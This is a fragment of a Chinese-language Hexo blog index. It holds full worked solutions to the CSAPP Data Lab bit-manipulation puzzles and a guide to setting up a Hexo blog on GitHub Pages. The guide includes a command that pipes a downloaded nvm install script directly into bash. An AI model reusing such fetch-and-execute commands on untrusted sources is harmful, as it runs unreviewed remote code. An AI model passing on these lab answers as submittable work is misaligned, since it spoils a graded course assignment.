<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * logicalShift - shift x to the right by n, using a logical shift</span></span><br><span class="line"><span class="comment"> *   Can assume that 0 &lt;= n &lt;= 31</span></span><br><span class="line"><span class="comment"> *   Examples: logicalShift(0x87654321,4) = 0x08765432</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mask = ~(((<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &gt;&gt; n) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; n) &amp; mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h4><p>&emsp;&emsp;这题想了很久，正常的想法是将<code>x</code>一位一位地右移，用掩码1取最低位，再求和，然而操作符数量超标:D 然后想到，用<code>x &amp; 1</code>去检查<code>x</code>最后一位是否是1比较亏，可以用<code>x &amp; 0x00010001</code>，这样可以一次检查两位，最后将前后16位的结果汇总即可，然而操作符数量还是超标:D最终将<code>x</code>分了8组，<code>x &amp; 0x11111111</code>，每次检查8位，用了38个操作符，终于达标。这是所有题目中用的操作符数量最多的一题了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitCount - returns count of number of 1's in word</span></span><br><span class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 40</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">0x11</span> + (<span class="number">0x11</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0x11</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0x11</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> count = (x &amp; mask) + ((x &gt;&gt; <span class="number">1</span>) &amp; mask) +</span><br><span class="line">        ((x &gt;&gt; <span class="number">2</span>) &amp; mask) + ((x &gt;&gt; <span class="number">3</span>) &amp; mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (count &amp; <span class="number">7</span>) + ((count &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>) + ((count &gt;&gt; <span class="number">8</span>) &amp; <span class="number">7</span>) +</span><br><span class="line">        ((count &gt;&gt; <span class="number">12</span>) &amp; <span class="number">7</span>) + ((count &gt;&gt; <span class="number">16</span>) &amp; <span class="number">7</span>) + ((count &gt;&gt; <span class="number">20</span>) &amp; <span class="number">7</span>) +</span><br><span class="line">        ((count &gt;&gt; <span class="number">24</span>) &amp; <span class="number">7</span>) + ((count &gt;&gt; <span class="number">28</span>) &amp; <span class="number">7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h4><p>&emsp;&emsp;一开始想在0上面作文章，毕竟只有<code>bang(0) = 1</code>，但此路不通。<code>|</code>操作，二分法，逐渐把高位的1收集到低位，如<code>x = x | (x &gt;&gt; 16)</code>，如果高位的16位有1的话，就会被收集到低位的16位上，依此二分，收集到最后一位，刚好12个操作符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bang - Compute !x without using !</span></span><br><span class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12`</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ~x &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h4><p>&emsp;&emsp;最简单的一题，要熟悉二进制补码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="fitsBits"><a href="#fitsBits" class="headerlink" title="fitsBits"></a>fitsBits</h4><p>&emsp;&emsp;若<code>x</code>非负，考虑到<code>n</code>位二进制补码能表示的最大非负数为 $0b0111…111 $ （共<code>n-1</code>个1），用掩码将<code>x</code>低位的<code>n-1</code>位置0，检查高位的<code>32 - (n - 1)</code>位是否为0即可。若<code>x</code>为负，先将其转为非负数<code>~x</code>，编码<code>~x</code>必需的位数与编码<code>x</code>的是相同的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fitsBits - return 1 if x can be represented as an</span></span><br><span class="line"><span class="comment"> *  n-bit, two's complement integer.</span></span><br><span class="line"><span class="comment"> *   1 &lt;= n &lt;= 32</span></span><br><span class="line"><span class="comment"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> minusOne = ~<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mask = minusOne &lt;&lt; (n + minusOne);</span><br><span class="line">    <span class="keyword">return</span> !((x ^ (x &gt;&gt; <span class="number">31</span>)) &amp; mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h4><p>&emsp;&emsp;<code>x &gt;&gt; n</code>即为$\lfloor x / 2^n \rfloor$，结果是向下取整的，但题目要求向0取整，若<code>x</code>非负向下取整即是向0取整没有问题，若<code>x</code>为负，需要向<code>x</code>加上一个偏移值$2^n - 1$，使得<code>x &gt;&gt; n</code>向上取整。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class="line"><span class="comment"> *  Round toward zero</span></span><br><span class="line"><span class="comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> signBit = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> bias = (signBit &lt;&lt; n) + (~signBit + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> (x + bias) &gt;&gt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h4><p>&emsp;&emsp;n位二进制补码的值域是$[-2^{n-1},\ 2^{n-1} - 1]$，并不关于0对称，因此当<code>x</code>为最小值时<code>-x</code>是它自己。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h4><p>&emsp;&emsp;正数的符号位为0，0的符号位也是0，是特殊情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Example: isPositive(-1) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (!!x) &amp; (!(x &gt;&gt; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h4><p>&emsp;&emsp;<code>isLessOrEqual</code>等价于<code>!isGreater</code>，实现<code>isGreater</code>简单点：若<code>x</code> <code>y</code>异号，则<code>x</code>必须非负<code>y</code>必须为负；若<code>x</code> <code>y</code> 同号，<code>x - y</code>不会溢出，必有<code>x - y &gt; 0</code>，即<code>x - y - 1 &gt;= 0</code>，即<code>x + ~y &gt;= 0</code>，检查<code>x + ~y</code>的符号位即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> xSign = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">int</span> ySign = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> hasSameSign = !(xSign ^ ySign);</span><br><span class="line">    <span class="keyword">int</span> diffSign = (x + ~y) &gt;&gt; <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> isXPosYNeg = (!xSign) &amp; ySign;</span><br><span class="line">    <span class="keyword">int</span> isGreater = isXPosYNeg | (hasSameSign &amp; !diffSign);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !isGreater;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h4><p>&emsp;&emsp;这道题允许90个操作符，是所有题目对操作符数量最宽松的了。<code>ilog2</code>的实质是求<code>x</code>最高位的1的索引，若<code>x</code>高位的16位有1，则不用管低位的16位；若<code>x</code>高位的8位有1，则不用管低位的24位，依次类推。实现起来还是十分巧妙的:)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> high16, high8, high4, high2, high1;</span><br><span class="line"></span><br><span class="line">    high16 = (!!(x &gt;&gt; <span class="number">16</span>)) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    x = x &gt;&gt; high16;</span><br><span class="line"></span><br><span class="line">    high8 = (!!(x &gt;&gt; <span class="number">8</span>)) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    x = x &gt;&gt; high8;</span><br><span class="line"></span><br><span class="line">    high4 = (!!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    x = x &gt;&gt; high4;</span><br><span class="line"></span><br><span class="line">    high2 = (!!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    x = x &gt;&gt; high2;</span><br><span class="line"></span><br><span class="line">    high1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> high1 + high2 + high4 + high8 + high16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h4><p>&emsp;&emsp;终于到浮点数了，浮点数的题对操作符要求宽松一点，还可以用循环跟判断语句。第一题，只要对IEEE754熟悉就行了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> isNaN = (((uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>) == <span class="number">0xFF</span>) &amp;&amp; (uf &lt;&lt; <span class="number">9</span>);</span><br><span class="line">    <span class="keyword">return</span> isNaN ? uf : ((<span class="number">1</span> &lt;&lt; <span class="number">31</span>) ^ uf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h4><p>&emsp;&emsp;没什么技巧，十分暴力。从符号位，阶码，尾数，舍入，一个一个来。注意，<code>float(x)</code>是向偶数取整的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> sign = x &amp; (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> frac = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> round = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> absX = sign ? (~x + <span class="number">1</span>) : x;</span><br><span class="line">    <span class="keyword">unsigned</span> tmp = absX;</span><br><span class="line">    <span class="keyword">while</span> ((tmp = tmp &gt;&gt; <span class="number">1</span>))</span><br><span class="line">        ++<span class="built_in">exp</span>;</span><br><span class="line"></span><br><span class="line">    frac = absX &lt;&lt; (<span class="number">31</span> - <span class="built_in">exp</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    round = frac &lt;&lt; <span class="number">23</span> &gt;&gt; <span class="number">23</span>;</span><br><span class="line">    frac = frac &gt;&gt; <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (round &gt; <span class="number">0x100</span>) round = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (round &lt; <span class="number">0x100</span>) round = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> round = frac &amp; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x ? (sign | ((<span class="built_in">exp</span> + <span class="number">0x7F</span>) &lt;&lt; <span class="number">23</span>) | frac) + round : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="float-twice"><a href="#float-twice" class="headerlink" title="float_twice"></a>float_twice</h4><p>&emsp;&emsp;还是很暴力，按照浮点数分类一个一个来：特殊值，直接返回；规范化的浮点数，阶码加1；非规范化的，左移一位并保持符号位不变。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> sign = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> isNormalized = uf &lt;&lt; <span class="number">1</span> &gt;&gt; <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> isSpecial = isNormalized == <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isSpecial || uf == <span class="number">0</span> || uf == sign)</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isNormalized)</span><br><span class="line">        <span class="keyword">return</span> uf + (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (uf &lt;&lt; <span class="number">1</span>) | (uf &amp; sign);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CSAPP</tag>
        <tag>C语言</tag>
        <tag>位操作</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo + GitHub Page 博客诞生记</title>
    <url>/2018/10/16/bo-ke-dang-sheng-ji/</url>
    <content><![CDATA[<p>&emsp;&emsp;最近工作关系，需搭建一个SQL Server集群，同样的事情之前就做过一次，但这次仍然麻烦不断，茫茫互联网，频频Google，浪费了好多时间。好记性不如烂笔头，遂决定建个博客，来记录工作学习中的问题。<br>&emsp;&emsp;开篇，就简单记录一下Hexo + GitHub Page搭建这个博客的过程吧。<a id="more"></a></p>
<h4 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h4><p><a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>基于Node，Ubuntu官方源的Node版本很旧，先用<a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>安装新版Node。<br>npm官方源在国内也比较慢，替换为淘宝的源。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装nvm</span></span><br><span class="line">$ wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装最新稳定版Node.js</span></span><br><span class="line">$ nvm install --lts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改npm源为淘宝</span></span><br><span class="line">$ npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Hexo</span></span><br><span class="line">$ npm install -g hexo-cli -g</span><br></pre></td></tr></table></figure>

<h4 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h4><ol>
<li>在GitHub注册帐号<code>zzzz-qq</code>，新建空的repo <code>zzzz-qq.github.io</code></li>
<li>Hexo初始化<br>需要两个分支：hexo分支存放<code>hexo init</code>生成的源文件，master分支存放Hexo生成用于部署的静态网站。<br>新建一个repo<code>zzzz-qq.github.io.hexo</code>专门用于管理Hexo源文件也可以，不过我还是偏向于分支。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init zzzz-qq.github.io</span><br><span class="line">$ <span class="built_in">cd</span> zzzz-qq.github.io</span><br><span class="line">$ git init</span><br><span class="line">$ git remote add origin https://github.com/zzzz-qq/zzzz-qq.github.io.git</span><br><span class="line">$ git checkout -b hexo</span><br></pre></td></tr></table></figure></li>
<li>submodule 管理主题<br>选择了<a href="https://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT Theme</a>，用的人比较多，文档很详细。<br>另外，若直接clone主题，无法与主题更新保持同步，所以每个主题应该作为一个submodule单独管理，先到GitHub fork要用的主题，主题配置作为单独的commit。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git submodule add https://github.com/zzzz-qq/hexo-theme-next.git themes\next</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主题配置: 编辑themes/next/_config.yml</span></span><br><span class="line">$ <span class="built_in">cd</span> themes/next &amp;&amp; git add .</span><br><span class="line">$ git commit -m <span class="string">"init config"</span></span><br><span class="line">$ git push</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新主题，只需要在fork的repo rebase原repo，然后更新submodule</span></span><br><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h4 id="写作与部署"><a href="#写作与部署" class="headerlink" title="写作与部署"></a>写作与部署</h4><ol>
<li><p>写文章</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new test_hexo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑文章 source/_posts/test_hexo.md</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Hexo部署到master分支</p>
</li>
</ol>
<ul>
<li>修改站点配置文件<code>zzzz-qq.github.io\_config.yml</code><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/zzzz-qq/zzzz-qq.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></li>
<li>安装部署工具<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li>
<li>部署<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo clean</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>GitHub Pages</tag>
      </tags>
  </entry>
</search>
